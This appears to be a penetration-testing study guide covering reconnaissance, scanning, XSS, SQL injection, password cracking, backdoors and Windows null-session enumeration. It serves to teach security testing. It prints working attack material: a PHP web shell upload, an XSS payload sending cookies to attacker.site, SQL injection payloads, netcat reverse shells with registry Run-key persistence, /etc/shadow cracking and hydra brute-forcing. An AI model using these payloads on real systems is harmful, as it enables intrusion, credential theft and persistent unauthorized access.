---
description: 'Techniques, tools, and a professional penetration testing methodology.'
---

# Penetration Testing Basics

## Information Gathering

* Good vs Bad penetration tester.
* Darts example: better 1000 shots at a microscopic target or single shot to an impossible to miss big target?
* Cyclic process.
* Every information gathering stage will need the same focus and dedication as the first one.
* Your penetration test will be **as strong as your weakest skill**!
* First and one of the most crucial phases of an engagement.
* A penetration tester cannot leave any stone unturned.

### Open-Source Intelligence

* Widening the attack surface.
* Mounting targeted attacks.
* Sharpening your tools in preparation for the next phases.

Information Gathering from Social Networks:

* CrunchBase: find detailed information about founders, investors, employees, buyouts and acquisitions.

Government Sites:

* System for Award Management.
* GSA eLibrary.

Whois database \(also accessible through Linux command `whois`\):

* Owner name.
* Street addresses.
* Email Address.
* Technical Contacts.

Browsing Client's sites:

* Check products.
* Services.
* Technologies.
* Company Culture.

Discovering Emai Pattern:

* `name.surname@company.com`.
* `surname.name@company.com`.
* Many email systems tend to inform the sender that mail was not delivered because it does not exit.

### Subdomain Enumeration

* We keep on widening the attack surface, discovering as many websites owned by the company as possible.
* It's common for websites of the same company to share the same top-level domain name.
* Likely to find resources that:
  * May contain outdated software.
  * Buggy software.
  * Administrative Interfaces.
* Bug bounty program writeups.

Online services:

* [VirusTotal](https://www.virustotal.com)
* [DNSdumpster](https://dnsdumpster.com): a subscription is needed.
* [crt.sh](https://crt.sh): view certificates and see associated domains and subdomains.

Automated tools:

* `sublist3r` / `subbrute`: use domain wordlist in order to bruteforce subdomains.

```bash
# sublist3r using Passive DNS services
sublist3r -v -d google.com -b

# -v : verbose
# -d <domain>
# -b bruteforce

# amass
amass -ip -d google.com
```

## Footprinting & Scanning

> Never run any of these tools and techniques on any machine or network without proper authorization!

### Mapping a Network

These techniques work both on local and remote. Every host connected to the Internet or a private network must have a unique IP address.

Example:

```bash
Block: 200.200.0.0/16
2^16 hosts = 200.200.0.0 - 200.200.255.255
```

* `ping` command tests whether a machine is alive.
* Ping works by sending one or more special ICMP packets \(**echo request** - Type 8\).
* If the destination host replies with **ICMP echo reply**.
* ICMP is part of the IP protocol.
* `fping` is an improved version of the `ping` utility.
* When running `fping` on a LAN you are directly attached to, even if you use the `-a` option, you will get some warning messages about the offline hosts \(`ICMP Host Unreachable`\). Those messages are easily removed by: `fping -a g 192.168.82.0 192.168.82.255 2>/dev/null`.

```bash
fping -a -g IPRANGE

# -a option forces the tool to show only alive hosts
# -g option tells the tool we want to perform a ping sweep instead of standard ping

fping -a -g 10.54.12.0/24
fping -a -g 10.54.12.0 10.54.12.255
```

### Nmap Ping Scan

```bash
nmap -sn 200.200.0.0/16
nmap -sn -iL hostilist.txt
```

HOST DISCOVERY:

* `-sL`: List Scan - simply list targets to scan.
* `-sn`: Ping Scan - disable port scan.
* `-Pn`: Treat all hosts as online -- skip host discovery.
* `-PS/PA/PU/PY[portlist]`: TCP SYN/ACK, UDP or SCTP discovery to given ports.
* `-PE/PP/PM`: ICMP echo, timestamp, and netmask request discovery probes.
* `-PO[protocol list]`: IP Protocol Ping.

### OS Fingerprinting

* Possible to identify OS because of some tiny differences in the network stack implementation of the various OS.
* Signature of the host behavior.
* The signature is compared against a database of known OS signatures.
* Offline OS fingerprinting can be done with `p0f` but we'll use `nmap`.

```bash
nmap -Pn -O <target(s)>
# -Pn switch to skip the ping scan if you already know that the targets are alive
```

OS DETECTION:

* `-O`: Enable OS detection.
* `--osscan-limit`: Limit OS detection to promising targets.
* `--osscan-guess`: Guess OS more aggressively.

### Port Scanning

> Goals:
>
> * Prepare for the vulnerability assessment phase.
> * Perform stealth reconnaissance.
> * Detect firewalls.

* Port Scanning goes after knowing the active targets on the network.
* Determine what TCP/UDP ports are opened.
* Also knowing what services are running, software and version, on an specific port.
* Port scanners automate probes requests and response analysis.
* Also let you detect if there's a firewall between you and your target.
* 3-way handshake: If port is closed ➝ RST + ACK.

#### TCP Connect Scan

* Simplest way to perform a port scan.
* If the scanner receives a `RST` packet, then the port is closed.
* If the scanner is able to complete the connection, then the port is open.
* TCP Connect Scans are recoded in the daemon logs \(from the app point of view, the probe looks like a legitimate connection\).

#### TCP SYN Scan

* Default nmap scan.
* Stealthy by design
* Sends a SYN packet and analyzes the response coming from the target machine.
* If a RST packet is received, then port is closed.
* if a ACK packet is received, then the port is open \(and RST packet is sent to the target to stop the handshake\).
* Cannot be detected by looking at daemons logs.

#### Nmap Scan Types

```bash
-sT # performs a TCP connect scan
-sS # performs a SYN scan
-sV # performs a version detection scan
```

* `-sV` version detection scan mixes a TCP connect scan with some probes, which are used to detect what application is listening on a particular port, which isn't stealthy but useful.
* During version detection scan, Nmap performs a TCP connect and reads from the banner of the daemon listening on a port.
* If the daemon does not send a banner, nmap sends some probes to understand what application is, by studying its behavior

#### NMAP Port Scanning

```bash
nmap -sn 192.168.1.0/24 > hosts-up.txt
nmap -sT -p80 192.168.1.0/24              # checks for all webservers in this network range
nmap -sS -sV -p 21 192.168.1.0/24         # checks for service version
```

#### Specifying targets

```bash
# By DNS name:
nmap <scan_type> target1.domain.com target2.domain.com

# With an IP address list
nmap <scan_type> 192.168.1.45 200.200.14.56 10.10.1.3

# CIDR notation
nmap <scan_type> 192.168.1.0/24 200.200.1.0/16

# By using wildcards
nmap <scan_type> 192.168.1.*
nmap <scan_type> 10.10.*.1
nmap <scan_type> 200.200.*.*

# Specifying ranges
nmap <scan_types> 200.200.6-12.*

# Octets Lists
nmap <scan_types> 10.14.33.1,3,17
nmap <scan_type> 10.14,20.3.1,3,17,233

# Choosing the ports to scan `-p`:
nmap -p 21,22,139,445,443,80 <target>
nmap -p 100-1000 <target>
```

#### Discovering Network with Port Scanning

* You might encounter networks that are protected by firewalls and where pings are blocked.
* It's not uncommon to come across a server that does not respond to pings but has many TCP/UDP ports open.
* `-Pn`: forces the scan on a server.
* If you would like to find an alive host, you can scan typical ports instead of performing a ping sweep.
* The four most basic TCP ports \(22, 445, 80, 443\) can be used as indicators of live hosts in the network.

#### Spotting a Firewall

* You might often see that a version was not recognized regardless of the open port.
* Or even the service type is not recognized.
* `tcpwrapped` means that the TCP handshake was completed but the remote host closed the connection without receiving any data.
* `--reason` nmap flag will show an explanation of why a port is marked as open or closed.

### `masscan`

* Another interesting tool that can help you to discover a network via probing TCP ports.
* Designed to deal with large networks and to scan thousands of IP addresses at once.
* Like `nmap` but a lot faster, however is less accurate.
* Maybe best to use this for host discovery and then conduct a detailed scan with nmap against certain hosts.

```bash
masscan -p22,80,443,53 -Pn --rate=800 --banners 192.168.0.0/24
masscan -p22,80,443,53 -Pn --rate=800 --banners 192.168.0.0/24 --echo > masscan.conf
```

### Examples: Scanning and OS Fingerprinting

```bash
# Perform a Ping Scan with Fping: Run a ping scan on the entire network with fping.
> fping -a -g 10.142.111.0/24 2> /dev/null

# Run a Ping Scan with Nmap
> nmap -sn -n 10.142.111.*

# Run a SYN Scan: This time run nmap only on the alive hosts.
> nmap -sS 10.142.111.1,6,48,96,99,100,213

# Version Detection Scan: Run the version detection scan and spot services running on non-conventional default ports.
> nmap -sV 10.142.111.1,6,48,96,99,100,213

# OS Fingerprinting
> nmap -O 10.142.111.1,6,48,96,99,100,213
```

## Vulnerability Assessment

{% hint style="info" %}
**Goal \#1:** Identify vulnerabilities and security misconfigurations.

**Goal \#2:** Prepare yourself for exploitation phase.
{% endhint %}

* Vulnerability assessment is a phase of the penetration testing process.
* Sometimes customers just asks for a vulnerability assessment instead of a penetration test.
* During the vulnerability assessment, you do not proceed to the exploitation phase.
* This implies that you will not be able to confirm the vulnerabilities by testing them and giving proof of their existence.
* A full penetration test is more in depth than just vulnerability assessment.
* Can be carried out both locally and remotely.
* Penetration testers use vulnerability scanners:
  * Database of known vulnerabilities.
  * Daemons listening on TCP and UDP ports.
  * Config files of OS, software suites, network devices, etc.
  * Windows registry entries.
  * The purpose of a scanner is to find vulnerabilities or misconfigurations.
  * This scanner tool is up to date by the vendor and it's constantly updated.

Some of them are:

* OpenVAS
* Nexpose
* GFI Lan Guard
* Nessus

If you have to test a custom app, a vulnerability scanner isn't enough, you have to test it manually. Studying custom applications means:

* Learning and understanding its features.
* Understanding how it exchanges data over the network.
* Understanding how it accesses resources like databases, servers, local and remote files and os on.
* Reverse engineering its logic.

### Nessus

* Nessus is a easy to use powerful vulnerability scanner that works great both on a small and large company network.
* It's free license for non-commercial use, so you can install and use it to secure your home network.
* It has two components: client & server.
  * _Client_ is used to configure the scans, provides a web interface to configure scans.
  * _Server_ performs the scan and repots back to the client, sends probes to systems and applications, collecting the responses and matching them against its vulnerability database.

These are the steps that a vulnerability scanner uses:

* Target hosts alive.
* Open ports.
* Service detection.
* For each detected service, the scanner queries its database looking for known vulnerabilities.
  * You can configure a scanner to ignore the operation system vulnerabilities and test only known web server vulnerabilities.
* Probing: scanner sends probes to verify if the vulnerability exists, this phase is prone to false positives.

## Web Attacks

### Fingerprinting with `nc`, `openssl` & `httprint`

Web applications use different technologies and programming paradigms compared to desktop apps:

* Web applications often make up the vast majority of the internet-facing surface.
* It can be done manually and by using automatic tools.
* Fingerprinting a web server means:
  * Web Server Service: IIS, Apache, nginx.
  * Version.
  * OS hosting the server.

```bash
# Manual Banner grabbing by sending requests to the server
# Output will be different for a Debian Linux Box, Apache Server running on Red Hat, MS IIS running on a MS Windows.
# `Netcat` does not perform any kind of encryption, so you cannot use it for HTTPS.

> nc <target_address> 80    # You must write your request after running the command
HEAD / HTTP/1.0             #  Write the request in uppercase always.

# `openssl` is a CLI to manually use various features of the OpenSSL SSL/TLS toolkit
# You can use it to establish a connection to an HTTPS service then send the usual HEAD HTTP verb:

> openssl s_client -connect target.site:443
HEAD / HTTP/1.0

# Another example:
printf 'GET / HTTP/1.1\r\nHost: github.com\r\n\r\n' | ncat --ssl github.com 443

# `httprint` is a web server fingerprinting tool that uses a signature-based technique to identify webservers
> httpprint -P0 -h <target hosts> -s <signature file>

# -PO to avoid pinging the host
# -h <target hosts> tells the tool to fingerprint a list of hosts, it is advised to use the IP address of the hosts you want to test
# -s set the signature file to use
```

### HTTP Verbs

* REST APIs are specific type of webapp that relies strongly on almost all HTTP verbs
* In REST APIs is common to use PUT for saving data, and not for saving files
* If you confirm a PUT or DELETE during an engagement, you should confirm its exact impact twice

```bash
# GET is used to request a resource
GET /page.php HTTP/1.1
Host: www.example.site

# You can also pass arguments to the web application
GET /page.php?course=PTS HTTP/1.1
Host: www.example.site

# POST is used to submit HTML form data
# POST parameters must be in the message body
POST /login.php HTTP/1.1
Host: www.example.site

username=john&password=mypass

# HEAD is very similar to GET, as it asks just headers of the response instead of the response body
HEAD / HTTP/1.1
Host: www.example.site

# PUT is used to upload a file to a server
PUT /path/to/destination HTTP/1.1
Host: www.example.site

<PUT DATA>

# DELETE is used to remove a file from the server
# Must be configured wisely as it might lead to DoS and data loss
DELETE /path/to/destination HTTP/1.1
Host: www.example.site

# OPTIONS is used to query the web server for enabled HTTP Verbs
OPTIONS / HTTP/1.1
Host: www.example.site
```

### Exploiting Misconfigured HTTP verbs

* 1st you enumerate verbs with an OPTIONS message in `nc`
* To exploit the DELETE verb, you just have to specify the file you want to delete from the server
* Exploiting PUT is more complex, because you have to know the size of the file you want to upload on the server, you can measure with `wc -m file` to count how long, in bytes, a payload is.
* Misconfigured HTTP verbs are becoming rare in web servers.
* You can still find a lot of misconfigured HTTP methods in embedded devices, IP cameras, digital video recorders and other smart devices.

```bash
nc victim.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content length: 20

<?php phpinfo(); ?>
```

```bash
# PHP Shell

> nc victim.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 136

if (isset($_GET['cmd'])) {
  $cmd = $_GET['cmd'];
  echo '<pre>';
  $result = shell_exec($cmd);
  echo $result;
  echo '</pre>';
}
```

### `nc`

```bash
# => server/listener
nc -lvp 8888
# -l listen
# -v verbose
# -p port
# -e execite

# => client
nc -v 127.0.0.1 8888

# => udp server
nc -lvup 9999

# => udp client
nc -vu localhost 9999

# Send text from Client to Server
# => Server
nc -lvp 8888 > received.txt
# => Client
echo "hello" | nc -v localhost 8888

# Send file from Client to Server
# => Server
nc -lvp 8888 > received.txt
# => Client
cat to_be_sent.txt | nc -v localhost 8888

# Bash command
# => Server
nc -lvp 5555 -e /bin/bash

# => client
echo 'ls' | nc -v localhost 5555
```

### Directories and Files Enumeration

> Ability to:
>
> * Find and utilize testing features
> * Exploit information saved in backup or old files
> * Find hidden resources

Enumeration helps you find those "hidden" resources that often contain:

* New and untested features
* Backup files
* Testing information
* Developer's notes

Two ways of enumerating resources:

* Pure brute-force
* Dictionary attacks

Tool:

* OWASP Dirbuster
  * Java application that can perform web resources enumeration
  * You can choose if you want to perform a pure brute-force or a dictionary-based brute-force
  * It's Linux alternative: `dirb`

### Dirb

```bash
dirb http://google.com /usr/share/dirb/wordlists/small.txt -a "USER AGENT HERE"

# Fill up Burpsuite with dirb requests
dirb http://google.com -p http://127.0.0.1:8080
dirb http://google.com -p http://127.0.0.1:8080 -c "COOKIE:XYZ"
dirb http://google.com -p http://127.0.0.1:8080 -u "admin:password" # basic auth
dirb http://google.com -p http://127.0.0.1:8080 -H "MyHeader: MyContent" # basic auth
dirb http://google.com -z 1000 # Add a milliseconds delay to not cause excessive flood
# -S silent
dirb http://google.com -X ".php,.bak" # use extensions
dirb http://google.com -x extensions.txt -z 1000
dirb http://google.com -x extensions.txt -o results.txt # output results to file
```

### Dirbuster

```bash
# Find all machines in the network
nmap -sn 10.104.11.0/24

# Identify the machines role (.96 runs a webserver)
nmap -sV 10.104.11.96,198
```

Find hidden files via dirbuster:

![](../.gitbook/assets/dirbuster.png)

You might find a `config.old` file where the MySQL database connection parameters are visible.

### Google Hacking

Perform information gathering without contacting your targets, ability to find hidden resources: `site:`, `intitle:`, `inurl:`, `filetype:`, `AND`, `OR`, `&`, `|`, `-`

```bash
inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf
```

### Cross Site Scripting

The attacker can target the web applications's users, and:

* Modify the content of the site at run-time
* Inject malicious contents
* Steal the cookies, thus the session of a user
* Perform actions on the web application as if it was a legitimate user

  User input is any parameter coming from the client-side of the webapp, as:

* Request headers
* Cookies
* Form inputs
* POST parameters
* GET parameters

  Actors of a XSS attack:

| Vulnerable Website | User/Visitor \(Victim\) | Penetration Tester |
| :--- | :--- | :--- |
| Inputs should always be validated server side | Code executed/rendered by the browser of the visiting users | Making their browsers load malicous content |
| Never ever trust user input | XSS vulnerabilities have low priority for developers, as it can be really hard for a victim to realize that an attack is in progress | Performing operations on their behalf, like buying a product or changing a password |
|  |  | Stealing the session cookies, thus being able to impersonate them on the vulnerable site |

* Reflection Point: When a search parameter is submitted through a form and gets displayed on the output in an XSS attack
* After finding a reflection point, you have to understand if you can inject HTML code and see if it somehow gets to the output of the page
* Test XSS: `<script>alert('XSS')</script>`

### XSS Types

**Reflected**

* When the malicious payload is carried inside the request that browser of the victim sends to the vulnerable website
* When users click on the link , the users trigger the attack
* `http://victim.site/search.php?find=<payload>`
* Called 'reflected' because an input field of the HTTP request sent by the browser gets immediately reflected to the output page
* Google Chrome has a reflected XSS filter built in to avoid this attack, but only trivial ones

**Persistent**

* Occur when the payload is sent to the vulnerable web server and then stored.
* When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload
* The malicious code gets delivered each and every time a web browser hits the "injected" web page
* A single attack can exploit multiple web applications
* The most common vector for persistent attacks are HTML forms that submit content to the web server and then display that content back to the users
* Element such as comments, user profiles, and forum posts are potential vector for XSS attacks

**DOM Based**

Cookie Stealing via XSS

* When `HttpOnly` flag is disabled, cookies can be stolen
* `<script>alert(document.cookie)</script>`
* With the following code, you can send cookies content to an attacker-controlled site:

```javascript
<script>
  var i = new Image();
  i.src = "http://attacker.site/log.php?q="+escape(document.cookie);
</script>
```

```php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
flocse($fp);
?>
```

### SQL Injections

They allow an unauthorized user to take control over SQL statements used by a web application. This kind of attack has a huge impact on a web site because getting control over a backend database means controlling:

* User's credentials
* Data of the web application
* Credit Card numbers
* Shopping transactions

To find SQL injections, we need to check any user input \(every input must be tested to conduct a professional pentest\):

* GET parameters
* POST parameters
* HTTP Headers
  * User-Agent
  * Cookie
  * Accept

Tests can be:

* String terminators: `' and ''`
* SQL commands: `SELECT`, `UNION` and others
* SQL comments: `#` or `--`

### SQL basics

```sql
-- SELECT <columns list> FROM <table> WHERE <conditions>;
SELECT name, description FROM products WHERE id=9;

-- UNION command performs a union between
<SELECT statement> UNION <other SELECT statement>;
```

### Vulnerable Dynamic Queries

```sql
-- This dynamic query expects $id values as a string:
SELECT Name, Description FROM Products WHERE ID='$id'

-- But what if an attacker crafts a $id value which can change the query to something like ` OR 'a'='a` then the query becomes:
SELECT Name, Description FORM Products WHERE UD='' OR 'a'='a';
-- ...which tells the database to select the items by checking two conditions which is always true.

-- An attacker could also exploit the UNION command by supplying the following:
-- ' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
-- Thus it changes the original query to:

SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
```

#### Boolean Based SQLi

Once penetration testers find a way to tell when a condition is true or false, they can ask the database some simple True/False questions:

* Is the first letter of the username 'a'?
* Does this database contain three tables?
* ...

We can use two MySQL functions: `user()` and `substring()`:

```sql
-- `user()` returns the name of the user currently using the database:
select user();

-- `substring()` returns a substring of the given argument. It takes 3 parameters:
--  - the input string
--  - the position of the substring
--  - its length

select substring('elarnsecurity', 2, 1)

-- We can use both together:
substring(user(), 1, 1);        -- it might return 'r' for 'root' user

substring(user(), 1, 1) = 'r'   -- if it returns 1 -> True; 0 -> False

-- Combining those features, we can iterate over the letters of the username by using payloads as:
-- ' or substr(user(), 1, 1) =='a
-- ' or substr(user(), 1, 1) =='b
-- when we find the first letter then we can move to the second and so on in order to guess the entire username.
```

#### UNION Based SQL Injections

Many times some of the results of a query are directly displayed on the output page. This behavior can be exploited using the UNION SQL command.

```sql
-- The following payload forces the web application to display the result of the `user()` function on the output page.

SELECT description FROM items where id='' UNION SELECT user(); -- -';

-- The comment at the end of the line prevents the following part of the original query from being parsed by the database, comments the rest from the original query.
-- The comment also contains a third dash because most of the browsers automatically remove trailing spaces in the URL so.
-- If you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment*.
-- Also used if we don't want our web application to add anything in the url after our injection.
```

To exploit a SQL injection you first need to know how many fields the vulnerable query selects, you do this by trial and error. We know there's an injection by `' UNION SELECT null; -- -`, this should display:

```bash
Warning: mysql_fetch_array() expects parameter 1 to be mysql_result, boolean given in /var/www/view.php on line 32
```

* We can try with two fields: `' UNION SELECT null null; -- -` and three even to confirm that the original query only has two fields.
* Once we know how many fields are in the query it's time to test which fields are part of the output page.
* You can do that by injecting some known values and checking thee results in the output page, as in: `' UNION SELECT 'elsid1', 'elsid2'; -- -`.
* Now we can exploit the injection: `' UNION SELECT user(), 'elsid2'; -- -`.
* Not only `SELECT` queries are vulnerable.

### SQLMap

* Can detect and exploit SQL injections
* Needs to know the vulnerable URL and the parameter to test for a SQLi

```bash
sqlmap -u <URL> -p <inejction parameter> [options]
sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
sqlmap -u <url> --data=<POST string> -p id [options] # POST string as user=a&pass=a

# You can copy the POST string  from a request intercepted in Burp Suite
sqlmap -r file.req -p user
sqlmap -u 'http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=231&Submit=Submit#' --cookie="PHPSESSID=26faf41ffba440ce1346b8d8ca9408ac; security=low" -D dvwa -T users --dump

# --technique=U --> UNION based SQL injection technique
# --banner shows server's banner
# --flush-session

sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D awd -T accounts --dump
```

#### From discord \(to test\)

```sql
1' UNION SELECT 1-- -

3' AND sleep(5) -- -

SELECT 1, schema_name,3 FROM information_schema.schemata limit 1,1-- -

SELECT 1, table_name,3 FROM information_schema.tables WHERE table_schema=hotel limit 1,1-- -

SELECT 1, column_name,3 FROM information_schema.columns WHERE table_schema=hotel and table_name=room limit 1,1

SELECT 1, table_name,3 FROM information_schema.tables limit 1,1-- -

SELECT group_concat(email,0x3a,Password) from awd.accounts limit 1,1;
```

## System Attacks

### Backdoor

Backdoors have two components, server and client:

* _Server_ runs on the victim machine listening on the network in order to accept connections.
* _Client_ runs on the attacker machine.
* `Netbus` or `SubSeven` are very famous.
* If the backdoor server sits behind a firewall, the easiest way to archive a connection is using a **Connect-back Backdoor** or **Reverse Backdoor**.
* A firewall cannot tell the difference between a user surfing the web and a backdoor connecting back to the attacker's machine.

#### Create stable connection to a remote host

```bash
# => Listener
ncat -l -v -p 5555 -e /bin/bash
# => Client
ncat localhost 5555

## Reverse connection
# => Attacker/Listener
ncat -l -p 5555 -v
# => Victim / Client
ncat -e /bin/bash remoteIP remotePort

# bash interactive for friendly prompt
bash -i
```

```bash
# Persist execution in windows
> regedit.exe
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Run

# Add string value
Name: ncact
Value: yourpath\ncat attackerMachine Port -e cmd.exe
```

```bash
# Persistent connection script
# By default netcat does not have a persistent connection.
# You will need to run it in a while loop if you want to connect to it more than once.
# Otherwise it will close the program after the first connection:
# https://defcon.org/images/defcon-22/dc-22-presentations/Nemus/DEFCON-22-Lance-Buttars-Nemus-Intro-to-backdooring-OS.pdf

#!/bin/bash
while [ 1 ]; do
  echo | ncat -l -v -p 445 -e /bin/bash
done
```

### Password Attacks

Normally stored in an encrypted form, preventing a malicious local user from getting to know user's passwords, using a _one-way encryption algorithm_, using a cryptographic hashing function. There are three main strategies:

#### Brute force attacks

> This method is only used when other attack vectors fail.

You try them all by _generating_ and testing all the possible valid passwords. Given enough time, a brute force attack is always successful.

* Long passwords made by upper and lower case letters, numbers and symbols can take days or even years to crack
* _John The Ripper_: can mount both brute force and dictionary-based attacks against a password database \(see: `john --list=formats`\)
  * Fast because of the high use of parallelization, crack strategies
  * `/etc/passwd`: contains info about user accounts
  * `/etc/shadow`: contains info about the actual password hashes
  * `john` needs the username and the password hashes to be in the same file, therefore we need to use the `unshadow` utility that comes with _John The Ripper_
  * `john -incremental -users:<users list> <file to crack>`
  * `john -incremental -users:victim crackme`
  * To display the passwords recovered by `john`, use: `john --show <file>`

#### Dictionary attacks

* Common passwords
* Faster than pure brute force attacks
* Poorly chosen or default passwords are more exposed to dictionary cracking
* `john -wordlist=<custom wordlist file> <file to crack>`
* Install password dictionaries: `apt-get install seclists`
  * You'll find them in `/usr/share/seclists/Passwords`
* **Mangling words**
  * Variations on dictionary words
  * `john -wordlist=<custom wordlist file> <file to crack> -rules <file to crack>`

#### Rainbow Tables\*\*

* Offer a tradeoff between the processing time needed to calculate the hash of a password and the storage space needed to mount an attack.
* A rainbow table contains links between the results of a run of one hashing function and another.
* Rainbow tables are BIG in file size, but reduces a cracking session from days to seconds.
* Great choice to crack simple and complex short passwords.
* `Ophcrack` rainbow cracking for Windows authentication passwords \(can run on Linux too\).

### John the Ripper

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/john/password.lst hashes.txt
cat /root/.john/john.pot
```

### Hashcat

```bash
# -m hash-type
# -a various attack mode
# -b benchmark
# -D specify the device
# -O optimize performance

> hashcat -b

# Wordlist attack
> hashcat -m 0 -a 0 -D2 example.hash example.dict
# -m 0 md5 type of hash
# -a 0 simple dictionary attack

# Rules
# Mutate dictionary words by setting different rules
custom.rule:

l
u
c
r
$1
$2
[
]
^1
^a
^!$!

# also hashcat comes with builtin rules

# Mask Attack
# 5 letter passwords = 5 masks
> hascat -m 0 -a 3 example.hash ?l?l?l?l
```

### Buffer Overflow Attacks

A BoF attack can lead to:

* An app or OS crash \(DoS\).
* Privilege escalation.
* Remote code execution.
* Security features bypass.

A buffer is an area in the RAM reserved for temporary data storage:

* User input, parts of a video file, server banners received by a client application. etc.
* Buffers have a finite size, therefore: if an app developer does not enforce a buffer limit, an attacker could find a way to write data beyond those limits and write there arbitrary code

#### Stack

* A stack is a data structure used to store data.
* Two operation for LIFO stacks: `pop` & `push`.
* Space on the stack can be allocated from app's code.
* An overflow happens when an attacker overwrites on a reserved space, so overwriting a function return address means getting control over the app.
* If an attacker manages to overflow a local variable from the app, the attacker would be able to overwrite the _Base Pointer_ and then get a _Return Address_.
* If the attacker overwrites the _Return Address_ with the right value, they are able to control the execution flow of the program.
* This technique can be exploited by writing custom tools and applications or by using hacking tools as Metasploit.

Being able to write a buffer overflow exploit requires a deep understanding of assembly programming, how applications and OS works and some exotic programming skills.

## Network Attacks

### Authentication Cracking

A similar approach to cracking a password can be used for every service requiring network authentication as: `ssh`, `telnet`, remote desktop, HTTP authentication, etc.

### Brute Force vs Dictionary Attacks

Performing pure brute force attacks over a network are very impractical because of the time needed to run each probe:

* Network latency.
* Delays on the attacked service.
* Processing time on the attacked server.
* Network authentication cracking _relies almost entirely on dictionary-based attacks_, using dictionaries of common and default usernames and passwords

**Hydra**

Fast, parallelized, network authentication cracker that supports different protocols: Cisco auth, `FTP`, `HTTP`, `IMAP`, `RDP`, `SMB`, `SSH`, `Telnet`...

```bash
# To get detailed information about a module:
hydra -U rdp

# To launch a dictionary attack against a service:
hydra -L users.txt -P pass.txt <service://server> <options>

# For instance
hydra -L users.txt -P pass.txt telnet://target.server

# Attack session against a password protected web resource
hydra -L users.txt -P pass.txt http-get://localhost/

# Brute-force login form
# => See Module Info
> hydra -U http-post-form
# Our cmd
> hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/sseclist/Passwords/rockyou-15.txt -f -V

# Brute-force SSH
hydra 10.10.10.3 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -V

# -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
# -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
```

### Windows Shares

> Ability to:
>
> * Enumerate network resources.
> * Attack Windows sessions.
> * Obtain unauthorized access to Windows resources.

Windows' filesharing can be exploited via _NetBIOS_ \(Network Basic Input Output System\):

* Allows servers and clients to view network shares on a local area network.
* It can supply some of the following information while querying computers: Hostname, NetBIOS name, Domain, Network shares.
* NetBIOS sits between the application layer and the IP layer \(NetBIOS over TCP/IP\).
  * UDP is used to perform name resolution and to carry other one-to-many datagram-based communications \(like send small messages to the rest of the other hosts\).
  * TCP is used for heavy traffic, as copying files over the network, using _NetBIOS sessions_.
* MS Windows browses the network using NetBIOS to:
  * Datagrams to list the shares and the machines.
  * Names to find workgroups.
  * Sessions to transmit data to and from a Windows share.

#### Shares

An authorized user can access shares by using **UNC Paths \(Universal Naming Connection Paths**:

```bash
\\ServerName\ShareName\file.nat
\\ComputerName\C$ # access to a volume (C$, D$, E$)
\\ComputerName\admin$ # points to the windows installation directory
\\ComputerName\ipc$  # used for inter-process communication, cannot be browsed via Explorer
```

> Badly configured shares exploitation can lead to:
>
> * Information disclosure.
> * Unauthorized file access.
> * Information leakage used to mount a targeted attack.

### Null Sessions

Null session attacks can be used to enumerate a lot of information: Passwords, System users, System groups, Running system processes.

* Remotely exploitable.
* Nowadays Windows is configured to be immune to this kind of attack.
* Applicable to legacy systems.
* Exploits an authentication vulnerability for Windows Administrative Shares, lets an attacker connect to a local or remote share without authentication.
* Enumerating shares is the first step needed to exploit a Windows machine vulnerable to null sessions.

#### Tools

* `nbstat`: windows cmd tool that can display info about the target.
* `nbstat -A <IP>`: displays info about a target.

```bash
Name                Type      Status
----------------------------------------
ELS-WINXP     <00>  UNIQUE    Registered
WORKGROUP     <00>  GROUP     Registered
ELS-WINXP     <20>  UNIQUE    Registered
```

* `ELS-WINXP`: name
* `<00>`: workstation
* `UNIQUE`: this computer must have only one IP address assigned
* `<20>`: file sharing service is up and running on the machine
* Once an attacker knows that a machine has a 'File Server' service running, they can enumerate the shares by using `net view`:

```bash
NET VIEW <target IP>
```

* Share enumeration from a Linux Machine is provided by the _Samba suite_.
* `nmblookup -A <target ip address>` gets the same results as `NET VIEW <target_IP>`.

`smbclient` also displays _shares that are hidden when using Windows standard tools_:

```bash
# To enumerate the shares provided by a host
smbclient -L //<target_IP> -N

# -L allows to look at what services are available on a target
# -N forces the tool to not ask for a password
```

Once we have detected that the File and Printer Sharing service is active and we have enumerated the available shares on a target, it's time to check if a null session attack is possible. We can exploit `IPC$` administrative share by trying to connect to it without valid credentials.

**Checking for Null Sessions with Windows**

To connect:

```text
# This tells Windows to connect to the IPC$ share by using an empty password and an empty username!
NET USE \\<target IP address>\IPC$ '' /u:''

smbclient //<target_IP>/IPC$ -N
```

**Exploiting Null Sessions with Enum**

```bash
enum -S <target>  # -S lets you enumerate the shares of a machine
enum -U <target>  # -U enumerates the users
enum -P <target>  # -P check the password policy
```

* Checking password policies before running an authentication attack lets you fin-tune an attack tool to:
  * Prevent accounts locking
  * Prevent false positives
  * Choose your dictionary or your bruteforcer configuration \(as knowing the min and max lengh of a password helps to save time\)

**Exploiting Null Session with Winfo**

Automates null session exploitation.

Use with `-n` to tell the tool to use null sessions

```bash
winfo <target_IP> -n
```

**Exploiting Null sessions with Enum4linux**

A PERL script that can perform the same operations of `enum` and `winfo`, supplying some other features:

* User enumeration
* Share enumeration
* Group and member enumeration
* Password policy extraction
* OS info detection
* A nmblookup run
* Printer information extraction

```bash
# Look for null sessions in the network
nmap -sS -p135,139,445 <IP>

# => enum4linux
# -n
# -P Password policies of the system
# -S shares available in the remote machine
# brute force:
enum4linux -s /usr/share/enum4linux/share-list.txt <IP>
# -a do all simple enumeration

